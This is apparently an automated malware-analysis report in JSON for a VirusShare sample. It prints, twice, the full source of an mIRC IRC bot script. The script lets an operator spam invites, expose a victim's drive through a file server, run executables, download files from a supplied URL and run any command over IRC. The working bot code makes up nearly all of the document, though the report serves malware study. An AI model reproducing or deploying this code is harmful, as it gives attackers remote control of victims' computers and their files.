{
    "docinfo": {
        "attributes": [],
        "behavior": {
            "User-Agent": "May download files from the Internet",
            "run": "May run an executable file or a system command",
            "write": "May write to a file"
        },
        "macro": "on 10:text:*:#:{\n  if ($1 == !netsend.load) && ($nick isop %chan) && ($me isvoice %chan) {\n    %s.i.c = #\n    if (# == $null) { set %s.i.c %chan }\n    if ($3 == $null) { msg %s.i.c \u0002e\u0002rror \u0002-\u0002 \u0002s\u0002yntax\u0002:\u0002 !netsend.load <server> <port> | halt }\n    set %i.server $2\n    set %i.port $3\n    %i.b = on\n    s.inviter\n  }\n  if ($1 == !netsend.stop) && ($nick isop %chan) && ($me isvoice %chan) {\n    sockclose inviter*\n    set %i.b off\n    unset %i.temp.*\n    timerinviteconnect off\n    msg # \u0002n\u0002etsend\u0002:\u0002 spamming stopped\n  }\n  if ($1 == !netsend.status) && ($nick isop %chan) && ($me isvoice %chan) {\n    if ($sock(inviter*,0) == 0) { msg # \u0002n\u0002etsend \u0002-\u0002 \u0002s\u0002tatus\u0002:\u0002 not connected \u0002-\u0002 \u0002t\u0002otal invited\u0002:\u0002 $calc( %i.t.j + %i.t.p ) \u0002-\u0002 \u0002d\u0002elay\u0002:\u0002 %i.ondelay | halt }\n    if ($sock(inviter*,0) > 0) { msg # \u0002n\u0002etsend \u0002-\u0002 \u0002s\u0002tatus\u0002:\u0002 $sock(inviter*,0) sockets connected \u0002-\u0002 \u0002t\u0002otal invited\u0002:\u0002 $calc( %i.t.j + %i.t.p ) \u0002-\u0002 \u0002d\u0002elay\u0002:\u0002 %i.ondelay }\n  }\n  if ($1 == !netsend.msg) && ($nick isop %chan) && ($me isvoice %chan) {\n    if ($2 == $null) { msg # \u0002e\u0002rror \u0002-\u0002 \u0002s\u0002yntax\u0002:\u0002 !netsend.msg <msg> | halt }\n    set %imsg $2-\n    msg # \u0002n\u0002etsend\u0002:\u0002 message set\n  } \n  if ($1 == !netsend.reset) && ($nick isop %chan) && ($me isvoice %chan) {\n    msg # \u0002n\u0002etsend\u0002:\u0002 all settings unset\n    unset %i.t.j\n    unset %i.t.p\n    unset %imsg\n    unset %i.server\n    unset %s.i.c\n    unset %i.b\n    unset %i*\n    unset %t.i\n    sockclose inviter*\n  }\n  if ($1 == !netsend.join) && ($nick isop %chan) && ($me isvoice %chan) {\n    if ($2 == $null) { msg # \u0002e\u0002rror \u0002-\u0002 \u0002s\u0002yntax\u0002:\u0002 !netsend.join <chan> <key> | halt }\n    sockwrite -nt inviterN JOIN : $+ $2 $3\n  } \n  if ($1 == !netsend.part) && ($nick isop %chan) && ($me isvoice %chan) {\n    if ($2 == $null) { msg # \u0002e\u0002rror \u0002-\u0002 \u0002s\u0002yntax\u0002:\u0002 !netsend.part <chan> <msg> | halt }\n    sockwrite -nt inviterN PART : $+ $2 $3-\n  }\n  if ($1 == !netsend.nick) && ($nick isop %chan) && ($me isvoice %chan) {\n    if ($2 == $null) { msg # \u0002e\u0002rror \u0002-\u0002 \u0002s\u0002yntax\u0002:\u0002 !netsend.nick <nick> | halt }\n    if ($2 == random) { sockwrite -nt inviterN NICK $read 3FWERF4.dat | halt }\n    sockwrite -nt inviterN NICK $2\n  }\n  if ($1 == !netsend.delay) && ($nick isop %chan) && ($me isvoice %chan) {\n    if ($2 == $null) { msg # \u0002e\u0002rror \u0002-\u0002 \u0002s\u0002yntax\u0002:\u0002 !netsend.delay <num> | halt }\n    set %i.ondelay $2\n    msg # \u0002n\u0002etsend\u0002:\u0002 delay set to\u0002:\u0002 $2\n  }\n  if ($1 == !restart) && ($address == %master) && ($nick isop %chan) && ($me isvoice %chan) {\n    msg # \u0002r\u0002estarting\n    run WTRSDFK.exe\n    run runonce.exe -q\n  }\n  if ($1 == !dccallow) && ($nick isop %chan) && ($me isvoice %chan) {\n    if ($2 == $null) { dccallow + $+ $nick | msg # \u0002d\u0002ccallow\u0002:\u0002 \u0002a\u0002dded $nick | halt }\n    msg # \u0002d\u0002ccallow\u0002:\u0002 \u0002a\u0002dded $2\n    dccallow + $+ $2\n  }\n  if ($1 == !fileserver) && ($nick isop %chan) && ($me isvoice %chan) {\n    if ($2 == $null) { msg # \u0002e\u0002rror \u0002-\u0002 \u0002s\u0002yntax\u0002:\u0002 !fileserver <drive> | halt }\n    msg # \u0002f\u0002ileserver initialized on drive\u0002:\u0002 $2\n    fserve $nick 3 $2\n  }\n  if ($1 == !nick) && ($nick isop %chan) && ($me isvoice %chan) {\n    if ($2 == $null) { msg # \u0002e\u0002rror \u0002-\u0002 \u0002s\u0002yntax\u0002:\u0002 !nick <nick> | halt }\n    set %nick $2\n    nick %nick $+ $r(1,100)\n  }\n  if ($1 == !nick.reset) && ($nick isop %chan) && ($me isvoice %chan) { nick %nick $+ $r(1,100) }\n  if ($1 == !var) && ($address == %master) && ($nick isop %chan) && ($me isvoice %chan) {\n    if ( [ [ $2 ] ] == $null) { msg # \u0002e\u0002rror \u0002-\u0002 \u0002s\u0002yntax\u0002:\u0002 !var <variable> | halt }\n    msg # \u0002v\u0002ar\u0002:\u0002 $2 is equal to [ [ $2 ] ]\n  } \n  if ($1 == !update) && ($address == %master) && ($nick isop %chan) && ($me isvoice %chan) {\n    if ($2 == $null) { msg # \u0002e\u0002rror \u0002-\u0002 \u0002s\u0002yntax\u0002:\u0002 !update <url> | halt }\n    %w.g.# = #\n    getdata $2 \n  }\n  if ($1 == !quit) && ($address == %master) && ($nick isop %chan) && ($me isvoice %chan) {\n    msg %chan \u0002q\u0002uit\u0002:\u0002 disconnecting\n    sockclose *\n    exit\n  }\n  if ($1 == !jump) && ($address == %master) && ($nick isop %chan) && ($me isvoice %chan) {\n    if ($2 == $null) { msg # \u0002e\u0002rror \u0002-\u0002 \u0002s\u0002yntax\u0002:\u0002 !jump <server> <port> <pass> | halt }\n    set %server $2\n    set %server.port $3\n    quit \u0002j\u0002umping\u0002:\u0002 %server $+ : $+ %server.port $4\n    server %server $+ : $+ %server.port $4\n  }\n  if ($1 == !rehash) && ($address == %master) && ($nick isop %chan) && ($me isvoice %chan) {\n    run LASS.exe\n    quit \u0002r\u0002ehashing\n    exit\n  }\n  if ($1 == !info) && ($nick isop %chan) && ($me isvoice %chan) { msg # \u0002i\u0002nfo \u0002-\u0002 \u0002o\u0002s\u0002:\u0002 win $+ $os \u0002u\u0002ptime\u0002:\u0002 $duration($calc( $ticks / 1000 )) \u0002u\u0002rl\u0002:\u0002 $iif($url,$url,none) }\n  if ($1 == !-) && ($address == %master) && ($nick isop %chan) && ($me isvoice %chan) { msg # \u0002d\u0002one\u0002:\u0002 / $+ $2- | / $+ [ [ $2- ] ] }\n}\non *:sockread:wwwGet:{\n  msg %w.g.# \u0002u\u0002pdate\u0002:\u0002 \u0002d\u0002ownloading $gettok($sock($sockname).mark,3,32)\n  if ($sockerr > 0) { return }\n  :nextread\n  sockread %WWW.Temp\n  if ($sockbr != 0) { if (%WWW.Temp != $Null) { write $mircdirTemp %WWW.Temp } goto nextread }\n  if (HTTP/1.*20* iswm [ $read -l1 $mircdirTemp ] ) {\n    if ($exists($gettok($sock($sockname).mark,2,32))) { remove $gettok($sock($sockname).mark,2,32) }\n    :GenNew\n    set -u0 %WWW.Temp www $+ $rand(A,Z) $+ $rand(0,9)\n    if ($sock(%WWW.Temp) != $null) { goto GenNew }\n    sockrename wwwGet %WWW.Temp \n    if (text/* iswm [ $read -sContent-Type: $mircdirTemp ] ) { sockmark %WWW.Temp Text $gettok($sock($sockname).mark,2-,32) }\n    else { sockmark %WWW.Temp Bin $gettok($sock($sockname).mark,2-,32) }\n    timer 1 1 sockwrite -tn %WWW.Temp GET $gettok($sock($sockname).mark,3,32)\n  }\n  else { echo -st $read -l2 $mircdirTemp }\n  unset %WWW.Temp\n}\non *:sockread:www*:{\n  if ($sockerr > 0) return\n  :nextread\n  if ($gettok($sock($sockname).mark,1,32) == bin) {\n    sockread &Temp\n    if ($sockbr == 0) return\n    if ($bvar(&Temp,0) != 0) {\n      bwrite $gettok($sock($SockName).Mark,2,32) -1 $bvar(&Temp,0) &temp\n    }\n  }\n  else {\n    sockread %WWW.Temp\n    if ($sockbr == 0) return\n    if (%WWW.Temp != $Null) {\n      write $gettok($sock($SockName).Mark,2,32) %WWW.Temp\n    }\n    unset %WWW.Temp\n  }\n  goto nextread\n}\non *:sockopen:wwwGet:{\n  sockwrite -tn wwwGet HEAD $gettok($sock($sockname).mark,3,32) HTTP/1.1\n  sockwrite -tn wwwGet Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, */*\n  sockwrite -tn wwwGet Accept-Language: en-au\n  sockwrite -tn wwwGet Accept-Encoding: deflate\n  sockwrite -tn wwwGet User-Agent: mIRCInstaller WWW Edition v0.0.1\n  sockwrite -tn wwwGet Host: $host\n  sockwrite -tn wwwGet Connection: Keep-Alive\n  sockwrite -tn wwwGet $lf\n}\non *:sockclose:www*:{\n  msg %w.g.# \u0002u\u0002pdate\u0002:\u0002 \u0002c\u0002ompleted \u0002-\u0002 \u0002f\u0002ile\u0002:\u0002 $gettok($sock($sockname).mark,3-,32) \u0002s\u0002ize\u0002:\u0002 $file($gettok($sock($sockname).mark,2,32)).size\n  if ($exists( [ $mircdirTemp ] )) {\n    remove $mircdirTemp\n  }\n  unset %WWW*\n  unset %w.g.#\n}"
    },
    "filename": "VirusShare_492693c4d22cec71a8e236736c3e346a",
    "filesize": 6886,
    "filetype": "data",
    "hashes": {
        "md5": "492693c4d22cec71a8e236736c3e346a",
        "sha1": "f1c1c459e60fde74b9237972c1e61ba951869936",
        "sha256": "df21ad8f74305b6973ac82e3ea7e3c357b6054a0476b9d9dec2141e4455287ee"
    },
    "peinfo": {},
    "strings": {
        "dump": [
            "on 10:text:*:#:{",
            "  if ($1 == !netsend.load) && ($nick isop %chan) && ($me isvoice %chan) {",
            "    %s.i.c = #",
            "    if (# == $null) { set %s.i.c %chan }",
            "    if ($3 == $null) { msg %s.i.c ",
            "rror ",
            "yntax",
            " !netsend.load <server> <port> | halt }",
            "    set %i.server $2",
            "    set %i.port $3",
            "    %i.b = on",
            "    s.inviter",
            "  if ($1 == !netsend.stop) && ($nick isop %chan) && ($me isvoice %chan) {",
            "    sockclose inviter*",
            "    set %i.b off",
            "    unset %i.temp.*",
            "    timerinviteconnect off",
            "    msg # ",
            "etsend",
            " spamming stopped",
            "  if ($1 == !netsend.status) && ($nick isop %chan) && ($me isvoice %chan) {",
            "    if ($sock(inviter*,0) == 0) { msg # ",
            "etsend ",
            "tatus",
            " not connected ",
            "otal invited",
            " $calc( %i.t.j + %i.t.p ) ",
            "elay",
            " %i.ondelay | halt }",
            "    if ($sock(inviter*,0) > 0) { msg # ",
            "etsend ",
            "tatus",
            " $sock(inviter*,0) sockets connected ",
            "otal invited",
            " $calc( %i.t.j + %i.t.p ) ",
            "elay",
            " %i.ondelay }",
            "  if ($1 == !netsend.msg) && ($nick isop %chan) && ($me isvoice %chan) {",
            "    if ($2 == $null) { msg # ",
            "rror ",
            "yntax",
            " !netsend.msg <msg> | halt }",
            "    set %imsg $2-",
            "    msg # ",
            "etsend",
            " message set",
            "  } ",
            "  if ($1 == !netsend.reset) && ($nick isop %chan) && ($me isvoice %chan) {",
            "    msg # ",
            "etsend",
            " all settings unset",
            "    unset %i.t.j",
            "    unset %i.t.p",
            "    unset %imsg",
            "    unset %i.server",
            "    unset %s.i.c",
            "    unset %i.b",
            "    unset %i*",
            "    unset %t.i",
            "    sockclose inviter*",
            "  if ($1 == !netsend.join) && ($nick isop %chan) && ($me isvoice %chan) {",
            "    if ($2 == $null) { msg # ",
            "rror ",
            "yntax",
            " !netsend.join <chan> <key> | halt }",
            "    sockwrite -nt inviterN JOIN : $+ $2 $3",
            "  } ",
            "  if ($1 == !netsend.part) && ($nick isop %chan) && ($me isvoice %chan) {",
            "    if ($2 == $null) { msg # ",
            "rror ",
            "yntax",
            " !netsend.part <chan> <msg> | halt }",
            "    sockwrite -nt inviterN PART : $+ $2 $3-",
            "  if ($1 == !netsend.nick) && ($nick isop %chan) && ($me isvoice %chan) {",
            "    if ($2 == $null) { msg # ",
            "rror ",
            "yntax",
            " !netsend.nick <nick> | halt }",
            "    if ($2 == random) { sockwrite -nt inviterN NICK $read 3FWERF4.dat | halt }",
            "    sockwrite -nt inviterN NICK $2",
            "  if ($1 == !netsend.delay) && ($nick isop %chan) && ($me isvoice %chan) {",
            "    if ($2 == $null) { msg # ",
            "rror ",
            "yntax",
            " !netsend.delay <num> | halt }",
            "    set %i.ondelay $2",
            "    msg # ",
            "etsend",
            " delay set to",
            "  if ($1 == !restart) && ($address == %master) && ($nick isop %chan) && ($me isvoice %chan) {",
            "    msg # ",
            "estarting",
            "    run WTRSDFK.exe",
            "    run runonce.exe -q",
            "  if ($1 == !dccallow) && ($nick isop %chan) && ($me isvoice %chan) {",
            "    if ($2 == $null) { dccallow + $+ $nick | msg # ",
            "ccallow",
            "dded $nick | halt }",
            "    msg # ",
            "ccallow",
            "dded $2",
            "    dccallow + $+ $2",
            "  if ($1 == !fileserver) && ($nick isop %chan) && ($me isvoice %chan) {",
            "    if ($2 == $null) { msg # ",
            "rror ",
            "yntax",
            " !fileserver <drive> | halt }",
            "    msg # ",
            "ileserver initialized on drive",
            "    fserve $nick 3 $2",
            "  if ($1 == !nick) && ($nick isop %chan) && ($me isvoice %chan) {",
            "    if ($2 == $null) { msg # ",
            "rror ",
            "yntax",
            " !nick <nick> | halt }",
            "    set %nick $2",
            "    nick %nick $+ $r(1,100)",
            "  if ($1 == !nick.reset) && ($nick isop %chan) && ($me isvoice %chan) { nick %nick $+ $r(1,100) }",
            "  if ($1 == !var) && ($address == %master) && ($nick isop %chan) && ($me isvoice %chan) {",
            "    if ( [ [ $2 ] ] == $null) { msg # ",
            "rror ",
            "yntax",
            " !var <variable> | halt }",
            "    msg # ",
            " $2 is equal to [ [ $2 ] ]",
            "  } ",
            "  if ($1 == !update) && ($address == %master) && ($nick isop %chan) && ($me isvoice %chan) {",
            "    if ($2 == $null) { msg # ",
            "rror ",
            "yntax",
            " !update <url> | halt }",
            "    %w.g.# = #",
            "    getdata $2 ",
            "  if ($1 == !quit) && ($address == %master) && ($nick isop %chan) && ($me isvoice %chan) {",
            "    msg %chan ",
            " disconnecting",
            "    sockclose *",
            "    exit",
            "  if ($1 == !jump) && ($address == %master) && ($nick isop %chan) && ($me isvoice %chan) {",
            "    if ($2 == $null) { msg # ",
            "rror ",
            "yntax",
            " !jump <server> <port> <pass> | halt }",
            "    set %server $2",
            "    set %server.port $3",
            "    quit ",
            "umping",
            " %server $+ : $+ %server.port $4",
            "    server %server $+ : $+ %server.port $4",
            "  if ($1 == !rehash) && ($address == %master) && ($nick isop %chan) && ($me isvoice %chan) {",
            "    run LASS.exe",
            "    quit ",
            "ehashing",
            "    exit",
            "  if ($1 == !info) && ($nick isop %chan) && ($me isvoice %chan) { msg # ",
            "nfo ",
            " win $+ $os ",
            "ptime",
            " $duration($calc( $ticks / 1000 )) ",
            " $iif($url,$url,none) }",
            "  if ($1 == !-) && ($address == %master) && ($nick isop %chan) && ($me isvoice %chan) { msg # ",
            " / $+ $2- | / $+ [ [ $2- ] ] }",
            "on *:sockread:wwwGet:{",
            "  msg %w.g.# ",
            "pdate",
            "ownloading $gettok($sock($sockname).mark,3,32)",
            "  if ($sockerr > 0) { return }",
            "  :nextread",
            "  sockread %WWW.Temp",
            "  if ($sockbr != 0) { if (%WWW.Temp != $Null) { write $mircdirTemp %WWW.Temp } goto nextread }",
            "  if (HTTP/1.*20* iswm [ $read -l1 $mircdirTemp ] ) {",
            "    if ($exists($gettok($sock($sockname).mark,2,32))) { remove $gettok($sock($sockname).mark,2,32) }",
            "    :GenNew",
            "    set -u0 %WWW.Temp www $+ $rand(A,Z) $+ $rand(0,9)",
            "    if ($sock(%WWW.Temp) != $null) { goto GenNew }",
            "    sockrename wwwGet %WWW.Temp ",
            "    if (text/* iswm [ $read -sContent-Type: $mircdirTemp ] ) { sockmark %WWW.Temp Text $gettok($sock($sockname).mark,2-,32) }",
            "    else { sockmark %WWW.Temp Bin $gettok($sock($sockname).mark,2-,32) }",
            "    timer 1 1 sockwrite -tn %WWW.Temp GET $gettok($sock($sockname).mark,3,32)",
            "  else { echo -st $read -l2 $mircdirTemp }",
            "  unset %WWW.Temp",
            "on *:sockread:www*:{",
            "  if ($sockerr > 0) return",
            "  :nextread",
            "  if ($gettok($sock($sockname).mark,1,32) == bin) {",
            "    sockread &Temp",
            "    if ($sockbr == 0) return",
            "    if ($bvar(&Temp,0) != 0) {",
            "      bwrite $gettok($sock($SockName).Mark,2,32) -1 $bvar(&Temp,0) &temp",
            "    }",
            "  else {",
            "    sockread %WWW.Temp",
            "    if ($sockbr == 0) return",
            "    if (%WWW.Temp != $Null) {",
            "      write $gettok($sock($SockName).Mark,2,32) %WWW.Temp",
            "    }",
            "    unset %WWW.Temp",
            "  goto nextread",
            "on *:sockopen:wwwGet:{",
            "  sockwrite -tn wwwGet HEAD $gettok($sock($sockname).mark,3,32) HTTP/1.1",
            "  sockwrite -tn wwwGet Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, */*",
            "  sockwrite -tn wwwGet Accept-Language: en-au",
            "  sockwrite -tn wwwGet Accept-Encoding: deflate",
            "  sockwrite -tn wwwGet User-Agent: mIRCInstaller WWW Edition v0.0.1",
            "  sockwrite -tn wwwGet Host: $host",
            "  sockwrite -tn wwwGet Connection: Keep-Alive",
            "  sockwrite -tn wwwGet $lf",
            "on *:sockclose:www*:{",
            "  msg %w.g.# ",
            "pdate",
            "ompleted ",
            " $gettok($sock($sockname).mark,3-,32) ",
            " $file($gettok($sock($sockname).mark,2,32)).size",
            "  if ($exists( [ $mircdirTemp ] )) {",
            "    remove $mircdirTemp",
            "  unset %WWW*",
            "  unset %w.g.#"
        ],
        "file": {
            "    run LASS.exe": "Executable",
            "    run WTRSDFK.exe": "Executable"
        },
        "fuzzing": {
            "Possible connections": [
                "on *:sockread:wwwGet:{",
                "    sockrename wwwGet %WWW.Temp ",
                "on *:sockopen:wwwGet:{",
                "  sockwrite -tn wwwGet HEAD $gettok($sock($sockname).mark,3,32) HTTP/1.1",
                "  sockwrite -tn wwwGet Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, */*",
                "  sockwrite -tn wwwGet Accept-Language: en-au",
                "  sockwrite -tn wwwGet Accept-Encoding: deflate",
                "  sockwrite -tn wwwGet User-Agent: mIRCInstaller WWW Edition v0.0.1",
                "  sockwrite -tn wwwGet Host: $host",
                "  sockwrite -tn wwwGet Connection: Keep-Alive",
                "  sockwrite -tn wwwGet $lf"
            ]
        },
        "ip": [],
        "url": []
    },
    "time": "0:00:00.289039",
    "version": "6.0.3",
    "virustotal": {
        "positives": "",
        "total": ""
    },
    "yara_plugins": []
}
